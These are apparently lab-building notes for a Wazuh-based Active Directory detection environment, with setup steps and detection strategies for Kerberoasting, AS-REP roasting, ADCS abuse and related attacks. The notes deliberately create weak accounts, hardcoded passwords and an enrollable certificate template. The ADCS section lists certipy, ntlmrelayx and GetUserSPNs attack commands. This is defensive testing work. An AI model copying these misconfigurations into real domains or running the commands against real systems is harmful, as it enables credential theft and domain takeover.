# Windows Setup

## Enterprise DC

- Set static IP Address
- Install Updates
- Set Administrator Password
- Install DS
- Reboot
- Install CA
  - Web Enrollment Feature
- Create Managed Service Account?
- FullEnforcement Mode
  - HKLM\SYSTEM\CurrentControlSet\Services\Kdc DWORD StrongCertificateBindingEnforcement 2
- Setup DNS conditional forwarder to ot-dmz

```
Import-Module ActiveDirectory
New-ADServiceAccount -Name svc_sql -Enabled $true -RestrictToSingleComputer

New-ADOrganizationalUnit -Name "Servers"

# create computer account by hand or script
New-ADComputer -Name SQLSERVER01
Move-ADObject -Identity "CN=SQLSERVER01,CN=Computers,DC=enterprise,DC=local" -TargetPath "OU=Servers,DC=enterprise,DC=local"

Add-ADComputerServiceAccount -Identity SQLSERVER01 -ServiceAccount svc_sql
setspn -S mssql/sqlserver01 svc_sql
setspn -S mssql/sqlserver01.enterprise.local svc_sql
New-ADUser -CannotChangePassword:$true -Name User1 -Enabled:$true -PasswordNeverExpires:$true -AccountPassword (ConvertTo-SecureString -AsPlainText -Force 'P@ssw0rd')
setspn -S afpserver/User1's-MacBook-Pro.home.local User1
New-ADUser -CannotChangePassword:$true -Name User2 -Enabled:$true -PasswordNeverExpires:$true -AccountPassword (ConvertTo-SecureString -AsPlainText -Force 'EQ36eMFWavqQ4pCYXBJn')
setspn -S http/iis10.enterprise.local User2
New-ADUser -CannotChangePassword:$true -Name HoneyToken -Enabled:$true -PasswordNeverExpires:$true -AccountPassword (ConvertTo-SecureString -AsPlainText -Force '#0n3y70k3n')
setspn -S http/iis6.enterprise.local HoneyToken
New-ADUser -CannotChangePassword:$true -Name UserNoPreauth -Enabled:$true -PasswordNeverExpires:$true -AccountPassword (ConvertTo-SecureString -AsPlainText -Force 'An36eMFWavqQ4pCYXBJn')
Set-ADAccountControl -Identity UserNoPreauth -DoesNotRequirePreAuth $true

# Create OU and move MSA

New-ADOrganizationalUnit 

# TODO: set Time zone
```
  
  
- Clone Certificate Template
  - Allow Authenticated Users Enroll
- New Certificate Template to issue
- Check if 4769 get logged, otherwise `Audit Kerberos Service Ticket Operations` in Account Logon
- Turn on LDAP Logging
```
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics -Name "15 Field Engineering" -Value 5
New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters -Name "Expensive Search Result Threshold" -PropertyType DWORD -Value 1
New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters -Name "Inefficient Search Results Threshold" -PropertyType DWORD -Value 1
```
- set Log size for `Directory Service` to 100MB+
- Setup Script according to LDAPQuerLogParserSetup.md
- Setup Scheduled Task to run LDAPQueryLogParser.ps1

- Create (or import) Group Policies
  - File Server Auditing
    - Computer Configuration > Policies > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Audit Policies > Object Access > Audit File System: Configure the following audit events: Success
  - Domain Controller Auditing
    - Computer Configuration > Policies > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Audit Policies > DS Access > Audit Directory Service Changes: Configure the following audit events: Success
    - Computer Configuration > Policies > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Audit Policies > Account Logon > Audit Kerberos Authentication Service: Configure the following audit events: Success, Failure
    - Computer Configuration > Policies > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Audit Policies > Account Logon > Audit Kerberos Service Ticket Operations: Configure the following audit events: Success
- Set Auditing Policy for Domain
  - dsa.msc
  - right-click domain root (enterprise.local)
  - Properties > Security > Advanced > Auditing > Add
  - Principal: Authenticated Users, Type: Success, Applies to: This object and all descendant objects
  - scroll down, click `clear all`
  - Tick `Write All Properties` in Permissions and Properties

## Fileserver

- Join Domain
- File Server Role
- Install Updates
- Install Wazuh
- Make Share
- move Fileserver to OU "Servers"
- Remove exclusion `and EventID != 4663 ` in ossec.conf
- Create honey token share
```
New-Item -Path C:\Shares\sensitive -ItemType Directory
New-SmbShare -ReadAccess "Authenticated Users" -Name "Sensitive$" -Path C:\Shares\sensitive
Set-Content C:\Shares\sensitive\passwords.txt -Value "User1:P@ssw0rd"
```
- Set Auditing on created file
  - Properties > Security > Advanced > Auditing > Add 
  - Authenticated Users; Success; (Show advanced permissions) Listfolder/read data; Delete

## Client

- Setup DNS
- Join Domain
- Install Updates
- Install Wazuh
- Download Pentest Tools (TODO packaging)
  - copy `client_attack.ps1` to client
- Install AtiveDirectory Cmdlets

```
Add-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0
Rename-Computer -NewName Client01 -DomainCredential (Get-Credential) -Restart
Add-computer -DomainName enterprise.local -Credential (Get-Credential)
```

# Exploit Chains

Interesting EVENTIDs:

|EventID|Source|Attack|Notes|
|-------|------|-----|-----|
|4768|Microsoft Windows security auditing|AS-REP Roast|TGT request|
|4769|Microsoft Windows security auditing|Kerberoasting|A Kerberos service ticket (TGS) was requested|
|4770|Microsoft Windows security auditing|Kerberoasting|A Kerberos service ticket was renewed|
|5136|Microsoft Windows security auditing|RBCD, Object Write|Property of object changed -> new computer, exploit weak ACL on ADObjects|
|41|Kdcsvc|ESC1|Certificate SID does not match User SID|
|4663||ReadCleartextPasswordFiles|(S): An attempt was made to access an object.|
|5140||ReadCleartextPassword|(S, F): A network share object was accessed.|

## Kerberoasting

### Detection Strategy:

- [x] suspicious LDAP Queries: `serviceprincipalname=*`
- [x] TGS issued 4769 with
  - [x] EncryptionType 0x17
  - [ ] (optional) TicketOptions 0x40810000 -> TODO check out values of Options
- [x] Honey Token Service Account

debug Kerberoast json content:
```
{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","providerGuid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","eventID":"4769","version":"1","level":"0","task":"14337","opcode":"0","keywords":"0x8020000000000000","systemTime":"2024-07-30T17:06:03.8684490Z","eventRecordID":"200090","processID":"656","threadID":"2316","channel":"Security","computer":"enterprise-dc.enterprise.local","severityValue":"AUDIT_SUCCESS","message":"\"A Kerberos service ticket was requested.\r\n\r\nAccount Information:\r\n\tAccount Name:\t\tAdministrator@ENTERPRISE.LOCAL\r\n\tAccount Domain:\t\tENTERPRISE.LOCAL\r\n\tLogon GUID:\t\t{1e786170-4bdb-896a-c0dc-1b56bc6ae3f7}\r\n\r\nService Information:\r\n\tService Name:\t\tENTERPRISE-DC$\r\n\tService ID:\t\tS-1-5-21-3294798438-2719725478-2944407717-1002\r\n\r\nNetwork Information:\r\n\tClient Address:\t\t::ffff:10.0.0.16\r\n\tClient Port:\t\t54539\r\n\r\nAdditional Information:\r\n\tTicket Options:\t\t0x40800000\r\n\tTicket Encryption Type:\t0x12\r\n\tFailure Code:\t\t0x0\r\n\tTransited Services:\t-\r\n\r\nTicket information\r\n\tRequest ticket hash:\t\tyh4SdtMr0LgEsYRqdGN7lfvskquFhB4OjAVucTC/lyo=\r\n\tResponse ticket hash:\t\t3z/uBdTPbvXhG+TPAQdtn8Jnim4G79KPYlkrdBuEkT8=\r\n\r\nThis event is generated every time access is requested to a resource such as a computer or a Windows service.  The service name indicates the resource to which access was requested.\r\n\r\nThis event can be correlated with Windows logon events by comparing the Logon GUID fields in each event.  The logon event occurs on the machine that was accessed, which is often a different machine than the domain controller which issued the service ticket.\r\n\r\nTicket options, encryption types, and failure codes are defined in RFC 4120.\""},"eventdata":{"targetUserName":"Administrator@ENTERPRISE.LOCAL","targetDomainName":"ENTERPRISE.LOCAL","serviceName":"ENTERPRISE-DC$","serviceSid":"S-1-5-21-3294798438-2719725478-2944407717-1002","ticketOptions":"0x40800000","ticketEncryptionType":"0x12","ipAddress":"::ffff:10.0.0.16","ipPort":"54539","status":"0x0","logonGuid":"{1e786170-4bdb-896a-c0dc-1b56bc6ae3f7}","requestTicketHash":"yh4SdtMr0LgEsYRqdGN7lfvskquFhB4OjAVucTC/lyo=","responseTicketHash":"3z/uBdTPbvXhG+TPAQdtn8Jnim4G79KPYlkrdBuEkT8="}}}
```

### Filter LDAP Queries

```
Internal
KCC
LSA
NTDSAPI
SAM
```

TODO Reverse event order -> get added to logfile descending

## ADCS Vulnerabilities

```
proxychains certipy-ad find -dc-ip 10.0.0.111 -ns 10.0.0.111 -dns-tcp -u user1@enterprise.local -p P@ssw0rd -vulnerable -stdout
sudo impacket-ntlmrelayx -t http://enterprise-dc.enterprise.local/certsrv/certfnsh.asp --adcs -smb2support
proxychains certipy-ad find -dc-ip 10.0.0.111 -ns 10.0.0.111 -dns-tcp -u user1@enterprise.local -p P@ssw0rd -vulnerable -stdout
proxychains certipy-ad req -dc-ip 10.0.0.111 -ns 10.0.0.111 -dns-tcp -u user1@enterprise.local -p P@ssw0rd -upn Administrator@enterprise.local -template ENTERPRISE-SmartCard -ca enterprise-ENTERPRISE-DC-CA
proxychains certipy-ad auth -dc-ip 10.0.0.111 -pfx administrator.pfx
proxychains impacket-GetUserSPNs -dc-ip 10.0.0.111 'enterprise.local/user1:P@ssw0rd'
```

### Detection strategy ESC1

- [x] Windows Server must be patched with May 10, 2022 patches to enable StrictEnforcementMode
- [ ] Wazuh Detection for Event

### Detection strategy ESC8
- Computer Accounts
  - Check if request comes from domain joined device
  - Detecting relaying by checking origin IP of request with reverse DNS
User Accounts: Check if requesting user has logon event on origin IP 
  - Check if request comes from domain joined device
  - Check if user has logon event on domain joined device in kerberos ticket lifetime span
## Kerberos Pre-Authentication
### Detection strategy
- [x] supspicious LDAP Queries
- [x] check for 4768 with RC4 encryption and pre-authentication type 0
## Cleartext in user-readable Locations
### Detection strategy
- [x] Setup honeyshares which are not mapped normally and monitor file access.

## Domain Trust Abuse
### Detection strategy
- [ ] Inspect Kerberos for SID-History if possible.
## Credential Reuse -> Password Spraying
### Detection strategy
- [x] Logon Count from common source exceeds threshold, possibly already implemented in vanilla Wazuh? -> Rule 60204 in 0580-win-security_rules.xml
  - [X] Detection if DC targeted
  - [ ] Detection if member server (FS) targeted -> no detection yet, maybe the log is not ingested?
## User initiated Domain Join
### Detection strategy 

Computer Creation per default not logged in Wazuh.

- [x] Monitor events and if adding user was in assigned domain joiner group (use same script as with ADObject writes)
  - normally event 4741 is logged if new computer is created, but if done with powermad, its not logged
  - better check for events created in both cases -> 5136 through auditing, logs possibly interesting values when object is changed:
    - objectClass -> change in object class might suggest new object creation -> check for 1.2.840.113556.1.3.30
    - sAMAccountName -> change in SAM ACcount name might suggest privileged operations
    

Example of Events 5136 created if computer is added to domain using powermad:

|timestamp|data.win.eventdata.attributeLDAPDisplayName|data.win.eventdata.attributeSyntaxOID|data.win.eventdata.attributeValue|
|-|-|-|-|
|Oct 1, 2024 @ 15:54:12.970|servicePrincipalName|2.5.5.12|RestrictedKrbHost/FAKE-PC|
|Oct 1, 2024 @ 15:54:12.942|servicePrincipalName|2.5.5.12|HOST/FAKE-PC|
|Oct 1, 2024 @ 15:54:12.926|servicePrincipalName|2.5.5.12|RestrictedKrbHost/FAKE-PC.enterprise.local|
|Oct 1, 2024 @ 15:54:12.910|servicePrincipalName|2.5.5.12|HOST/FAKE-PC.enterprise.local|
|Oct 1, 2024 @ 15:54:12.896|dNSHostName|2.5.5.12|FAKE-PC.enterprise.local|
|Oct 1, 2024 @ 15:54:12.877|userAccountControl|2.5.5.9|4096|
|Oct 1, 2024 @ 15:54:12.874|sAMAccountName|2.5.5.12|FAKE-PC$|
|Oct 1, 2024 @ 15:54:12.861|objectClass|2.5.5.2|1.2.840.113556.1.3.30|

Checking if user is in certain user group -> dynamically create list of allowed users and check in rule.
Point is, that CDB lists in wazuh suck very much. Lists must a) reside on the wazuh server and b) updates require wazuh to be restarted. So long for dynamic updates ...
Only solution for now is to stick with CDB lists and manually adjust them and reload the manager afterwards ... corporations could automate some of this chore.

Detection steps, check:
- if data.win.system.eventID is 5136
- if data.win.eventdata.objectClass is computer 
- if data.win.eventdata.subjectUserName is in CDB
- additionally if data.win.eventdata.attributeLDAPDisplayName is mdds-allowedtoactonbehalfofotheridentity (RBCD)

## SMB 
### Detection strategy
N/A
## LDAP
### Detection strategy
N/A
## WSUS
### Detection strategy
N/A
## Active Directory ACL Misconfigurations
### Detection stragety
- [x] Monitor Object writes (if feasible) and check against admins.
  - [ ] Dynamically create whitelist with all domain admins to feed wazuh -> could also be used to detect changes in domain admins
## Kerberos Delegations
### Detection strategy
N/A
